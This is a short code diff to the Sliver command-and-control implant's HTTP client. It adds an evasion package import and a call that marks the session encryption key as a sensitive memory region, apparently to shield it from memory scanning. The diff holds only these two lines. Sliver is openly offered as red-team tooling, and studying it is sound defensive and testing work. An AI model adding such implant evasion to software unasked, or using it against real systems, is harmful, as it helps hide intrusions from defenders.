@@ -41,6 +41,7 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
+	"github.com/bishopfox/sliver/implant/sliver/evasion"
 	"github.com/bishopfox/sliver/implant/sliver/util"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
@@ -180,6 +181,7 @@ type SliverHTTPClient struct {
 func (s *SliverHTTPClient) SessionInit() error {
 	sKey := cryptography.RandomSymmetricKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
+	evasion.RegisterSensitiveRegion(s.SessionCtx.Key[:])
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 
